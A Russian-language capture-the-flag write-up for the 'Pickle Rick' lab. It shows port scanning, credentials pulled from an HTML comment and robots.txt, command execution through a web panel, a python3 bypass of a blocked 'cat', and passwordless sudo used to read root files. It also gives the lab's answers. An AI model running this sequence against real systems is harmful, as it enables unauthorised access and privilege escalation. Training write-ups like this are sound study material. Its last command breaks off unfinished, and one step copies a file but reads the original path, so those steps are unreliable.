# Writeup: Pickle Rick

> This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

По задаче нам необходимо найти три ингредиент. Начнем со сканирования портов
```sh
nmap -sS -sV -p- 10.112.139.54
```
```sh
Starting Nmap 7.991SVN ( https://nmap.org )
Nmap scan report for 10.112.139.54
Host is up (0.0041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds
```

Ничего особого нет, пара портов по классике:
- 22 - ssh
- 80 - web-app  

Взлянем на наше приложение и посмотрим ответ от сервера при обращении к главной странице:
```sh
curl http://10.112.139.54
```
На главной странице сразу нам дают подсказку:
```
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```
Нам известно, что есть пользователь R1ckRul3s.  
Проверим robots.txt
```sh
curl http://10.112.139.54/robots.txt
```
```sh
Wubbalubbadubdub
```
Похоже на какой-то бессмысленный набор букв. Пойдем дальше и попрбуем методом перебора найти скрытые директории.  
При проверке со стандартными вордлистами мне так и не удалось найти чего-то интересного, но есть вот такой url: *http://10.112.139.54/assets/*. Он содержит какой-то контент, изображения, gif, которые используются веб-приложением.  

Меня заинтересовало изображение: http://10.112.139.54/assets/portal.jpg  
Есть догадка, что оно используется для страницы http://10.112.139.54/portal.php  

В итоге оказалось, что так оно есть, и на странице есть форма с логином и паролем. Для авторизации используем данные, которые нашли ранее:  
R1ckRul3s:Wubbalubbadubdub  

Да, доступы подошли. Теперь мы видим поле ввода, которое принимает какие-то команды. Попробуем комманды OS: ls
```sh
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
Да, это RCE, удаленное выполнение кода. И вроде как мы можем прочиатать файл с флагом:
```sh
cat Sup3rS3cretPickl3Ingred.txt
```
Но сразу ловим ошибку :)
```sh
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```
В таком случае можно проверить наличие python3: python3 --version
```sh
Python 3.8.10
```
Отлично, нам доступен интерпритатор python3. Попробуем прочитать файл:
```sh
python3 -c 'print(open("Sup3rS3cretPickl3Ingred.txt").read())'
```
Похоже, что мы нашли кое-то)
```sh
mr. meeseek hair
```

Попробуем проверить наши права, что мы можем делать от root:
```sh
sudo -l
```
```sh
Matching Defaults entries for www-data on ip-10-112-139-54:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-112-139-54:
    (ALL) NOPASSWD: ALL
```
Получается, мы можем выполнять команды от root без пароля. Супер. Проверим директорию рута
```sh
sudo ls /root/
```
Там мы нашли файл 3rd.txt. Но по какой-то причине не смог прочитать файл:
```sh
sudo python3 -c 'print(open("/root/3rd.txt").read())'
```
По этому просто скопировал его в текущую директорию и прочитал:
```sh
sudo cp /root/3rd.txt . && sudo python3 -c 'print(open("/root/3rd.txt").read())'
```
В ответ мы получили это:
```sh
3rd ingredients: fleeb juice
```

И остался последний флаг - флаг рика. При исследовании мы обнаруживаем пользовательскую директорию рика:
```sh
/home/rick
```
В этой директории находится второй флаг: *second ingredients*. Давайте его прочитаем:
```sh
sudo cp "/home/rick/second ingredients" rick.txt && 
```
В итоге мы захватили все флаги!
